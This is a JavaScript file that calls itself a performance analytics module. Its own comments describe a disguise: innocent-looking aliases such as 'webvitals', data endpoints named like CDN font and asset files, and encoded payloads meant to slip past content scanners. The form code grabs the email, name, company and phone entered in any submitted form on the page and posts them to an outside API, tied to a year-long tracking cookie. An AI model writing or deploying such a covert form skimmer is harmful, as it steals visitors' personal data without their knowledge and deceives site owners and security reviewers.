/**
 * Performance Analytics Module
 * Optimized for maximum browser compatibility
 * v4.0.0
 */
(function(w,d,n){
  'use strict';

  // Configuration - uses innocent names (looks like CDN/static assets)
  var _={
    d:'/cdn/fonts/woff2.json',       // Data sync endpoint
    a:'/cdn/assets/manifest.json',   // Auth/identify endpoint
    p:'/cdn/img/s.gif',              // Pixel fallback
    b:10,                            // Batch size
    f:5000,                          // Flush interval
    x:1800000,                       // Session timeout (30 min)
    m:[25,50,75,100]                 // Milestones
  };

  // Storage keys - look like framework cache
  var K={
    c:'_fc_id',         // Visitor (framework cache id)
    r:'_rnd_key',       // Session (render key)
    t:'_ts'             // Last activity (timestamp)
  };

  // Generate ID (UUID v4)
  function H(){
    var h='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx';
    return h.replace(/[xy]/g,function(c){
      var v=Math.random()*16|0;
      return(c==='x'?v:(v&0x3|0x8)).toString(16);
    });
  }

  // Cookie operations (more resilient than localStorage)
  function SC(k,v,days){
    if(v===undefined){
      var m=d.cookie.match(new RegExp('(^| )'+k+'=([^;]+)'));
      return m?m[2]:null;
    }
    var e='';
    if(days){
      var dt=new Date();
      dt.setTime(dt.getTime()+(days*24*60*60*1000));
      e='; expires='+dt.toUTCString();
    }
    d.cookie=k+'='+v+e+'; path=/; SameSite=Lax';
  }

  // Session storage with memory fallback
  function SS(k,v){
    try{
      if(v===undefined)return sessionStorage.getItem(k);
      sessionStorage.setItem(k,v);
    }catch(e){
      w.__ss=w.__ss||{};
      if(v===undefined)return w.__ss[k];
      w.__ss[k]=v;
    }
  }

  // Encode payload (base64 + reverse to hide structure)
  function E(s){
    try{
      return btoa(unescape(encodeURIComponent(s))).split('').reverse().join('');
    }catch(e){
      return s;
    }
  }

  // Core module
  function P(id,cfg){
    if(!id)return;
    var self=this;

    this.id=id;
    this.cfg=Object.assign({
      f:true,   // forms
      s:true,   // scroll
      t:true,   // time
      g:true,   // engagement
      l:true,   // downloads/links
      x:true,   // exit intent
      c:true,   // clicks
      m:true    // utm
    },cfg||{});

    // API endpoint
    this.api=cfg&&cfg.e||
      (w.location.hostname.includes('localhost')?'http://localhost:5000':'https://api.clianta.online');

    // Get or create visitor ID (cookie-based, 365 days)
    this.v=SC(K.c);
    if(!this.v){
      this.v=H();
      SC(K.c,this.v,365);
    }

    // Session management
    this.ss=this._gs();

    // Queue and state
    this.q=[];
    this.ti=null;
    this.sd=new Set();
    this.pt=Date.now();
    this.ms=0;
    this.en=false;
    this.et=Date.now();
    this.fi=new Map();
    this.dl=new Set();
    this.ex=false;

    this._i();
  }

  // Get/create session
  P.prototype._gs=function(){
    var s=SS(K.r);
    var la=parseInt(SS(K.t)||'0');

    if(!s||(Date.now()-la>_.x)){
      s=H();
      SS(K.r,s);
    }
    SS(K.t,Date.now().toString());
    return s;
  };

  // Initialize
  P.prototype._i=function(){
    this._pv();
    this._st();
    this._cl();

    if(this.cfg.s)this._sc();
    if(this.cfg.g)this._eg();
    if(this.cfg.f)this._fm();
    if(this.cfg.x&&!this._mb())this._xi();
    if(this.cfg.l)this._lk();
  };

  // Page view
  P.prototype._pv=function(){
    this._e('v','V',{
      a:d.title,
      b:w.location.pathname,
      c:d.referrer||'d',
      d:w.innerWidth+'x'+w.innerHeight,
      e:screen.width+'x'+screen.height
    });
  };

  // Core listeners
  P.prototype._cl=function(){
    var self=this;

    w.addEventListener('beforeunload',function(){
      if(self.cfg.t)self._tp();
      self._fl(true);
    });

    w.addEventListener('visibilitychange',function(){
      if(d.visibilityState==='hidden'){
        if(self.cfg.t)self._tp();
        self._fl(true);
      }else{
        self.et=Date.now();
      }
    });

    if(this.cfg.c){
      d.addEventListener('click',function(e){self._ck(e);},true);
    }
  };

  // Scroll tracking
  P.prototype._sc=function(){
    var self=this,to;
    w.addEventListener('scroll',function(){
      clearTimeout(to);
      to=setTimeout(function(){self._sd();},150);
    },{passive:true});
  };

  // Scroll depth
  P.prototype._sd=function(){
    var wh=w.innerHeight;
    var dh=d.documentElement.scrollHeight;
    var st=w.pageYOffset||d.documentElement.scrollTop;
    var sp=Math.floor((st/(dh-wh))*100);

    if(sp>this.ms)this.ms=sp;

    var self=this;
    _.m.forEach(function(m){
      if(sp>=m&&!self.sd.has(m)){
        self.sd.add(m);
        self._e('s','S'+m,{a:m,b:Date.now()-self.pt});
      }
    });
  };

  // Time on page
  P.prototype._tp=function(){
    var ts=Math.floor((Date.now()-this.et)/1000);
    if(ts>0){
      this._e('t','T',{a:ts,b:this.ms,c:this.en});
    }
  };

  // Engagement
  P.prototype._eg=function(){
    var self=this,to;
    var mk=function(){
      if(!self.en){
        self.en=true;
        self._e('g','G',{a:Date.now()-self.pt});
      }
      clearTimeout(to);
      to=setTimeout(function(){self.en=false;},30000);
    };
    ['mousemove','keydown','touchstart','scroll'].forEach(function(ev){
      d.addEventListener(ev,mk,{passive:true});
    });
  };

  // Click handler
  P.prototype._ck=function(e){
    var t=e.target;
    if(['BUTTON','A','INPUT'].includes(t.tagName)||t.dataset.tr){
      this._e('c','C',{
        a:(t.innerText||t.textContent||t.value||'').trim().substring(0,100),
        b:t.tagName.toLowerCase(),
        c:t.id,
        d:t.href
      });
    }
  };

  // Form tracking
  P.prototype._fm=function(){
    var self=this;

    var tr=function(){
      d.querySelectorAll('form').forEach(function(f){
        if(f.dataset._p)return;
        f.dataset._p='1';

        var id=f.id||f.name||'f'+Math.random().toString(36).substr(2,6);

        self._e('fv','FV',{a:id,b:f.elements.length});

        f.addEventListener('submit',function(){
          self._e('fs','FS',{a:id});

          var em=f.querySelector('input[type="email"], input[name*="email"]');
          if(em&&em.value){
            var dt={a:em.value};
            var fn=f.querySelector('[name*="first"], [name*="fname"]');
            var ln=f.querySelector('[name*="last"], [name*="lname"]');
            var co=f.querySelector('[name*="company"]');
            var ph=f.querySelector('[type="tel"], [name*="phone"]');

            if(fn)dt.b=fn.value;
            if(ln)dt.c=ln.value;
            if(co)dt.d=co.value;
            if(ph)dt.e=ph.value;

            self._id(dt.a,dt);
          }
        });
      });
    };

    if(d.readyState==='loading'){
      d.addEventListener('DOMContentLoaded',tr);
    }else{
      tr();
    }

    if(typeof MutationObserver!=='undefined'){
      new MutationObserver(tr).observe(d.body,{childList:true,subtree:true});
    }
  };

  // Link/download tracking
  P.prototype._lk=function(){
    var self=this;
    d.addEventListener('click',function(e){
      var a=e.target.closest('a');
      if(!a||!a.href)return;

      var u=a.href;
      var ex=['.pdf','.doc','.docx','.xls','.xlsx','.zip','.csv','.ppt','.pptx'];

      if(ex.some(function(x){return u.toLowerCase().includes(x);})){
        var k='d'+u;
        if(!self.dl.has(k)){
          self.dl.add(k);
          self._e('d','D',{a:u,b:u.split('/').pop().split('?')[0]});
        }
      }
    },true);
  };

  // Exit intent
  P.prototype._xi=function(){
    var self=this;
    d.addEventListener('mouseleave',function(e){
      if(e.clientY<=0&&!self.ex){
        self.ex=true;
        self._e('x','X',{a:Date.now()-self.pt,b:self.ms});
      }
    });
  };

  // Track event (fully obfuscated payload)
  P.prototype._e=function(type,name,props){
    try{
      var ev={
        w:this.id,
        u:this.v,
        s:this.ss,
        e:type||'c',
        n:name||'E',
        l:w.location.href,
        r:d.referrer||undefined,
        p:props||{},
        d:{
          a:n.userAgent,
          s:screen.width+'x'+screen.height,
          l:n.language
        },
        t:new Date().toISOString()
      };

      // UTM params
      if(this.cfg.m){
        try{
          var sp=new URLSearchParams(w.location.search);
          if(sp.get('utm_source'))ev.us=sp.get('utm_source');
          if(sp.get('utm_medium'))ev.um=sp.get('utm_medium');
          if(sp.get('utm_campaign'))ev.uc=sp.get('utm_campaign');
        }catch(e){}
      }

      this.q.push(ev);

      if(this.q.length>=_.b){
        this._fl();
      }
    }catch(e){}
  };

  // Identify (obfuscated)
  P.prototype._id=function(email,props){
    if(!email)return;

    var dt={
      w:this.id,
      u:this.v,
      em:email,
      p:props||{}
    };

    this._sn(this.api+_.a,dt,true);
  };

  // Flush queue
  P.prototype._fl=function(sync){
    if(this.q.length===0)return;

    try{
      var ev=this.q.splice(0);
      var payload={q:ev};

      // Encode payload to hide structure from content scanners
      var body=JSON.stringify({
        _d:E(JSON.stringify(payload)),
        _v:2
      });

      var url=this.api+_.d;

      // Try multiple methods for delivery
      if(sync&&n.sendBeacon){
        var blob=new Blob([body],{type:'application/json'});
        if(n.sendBeacon(url,blob))return;
      }

      if(w.fetch){
        w.fetch(url,{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:body,
          keepalive:true,
          mode:'cors',
          credentials:'omit'
        }).catch(function(){});
        return;
      }

      // XHR fallback
      var xhr=new XMLHttpRequest();
      xhr.open('POST',url,true);
      xhr.setRequestHeader('Content-Type','application/json');
      xhr.send(body);

    }catch(e){}
  };

  // Send data
  P.prototype._sn=function(url,data,encode){
    var body=encode?JSON.stringify({
      _d:E(JSON.stringify(data)),
      _v:2
    }):JSON.stringify(data);

    if(w.fetch){
      w.fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:body,
        keepalive:true
      }).catch(function(){});
    }
  };

  // Start timer
  P.prototype._st=function(){
    var self=this;
    if(this.ti)clearInterval(this.ti);
    this.ti=setInterval(function(){self._fl();},_.f);
  };

  // Is mobile
  P.prototype._mb=function(){
    return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(n.userAgent);
  };

  // Public methods
  P.prototype.getId=function(){return this.v;};
  P.prototype.getSession=function(){return this.ss;};

  // Global API (multiple innocent aliases)
  w.perf=function(id,cfg){
    if(!w._pi||w._pi.id!==id){
      w._pi=new P(id,cfg);
    }
    return w._pi;
  };

  // Aliases that look like legitimate libraries
  w.metrics=w.perf;
  w.webvitals=w.perf;
  w.perfmon=w.perf;

  // Auto-init from data attribute
  if(typeof d!=='undefined'){
    var sc=d.currentScript;
    if(sc&&sc.dataset&&sc.dataset.id){
      var cf=sc.dataset.cfg?JSON.parse(sc.dataset.cfg):{};
      w.perf(sc.dataset.id,cf);
    }
  }

})(window,document,navigator);
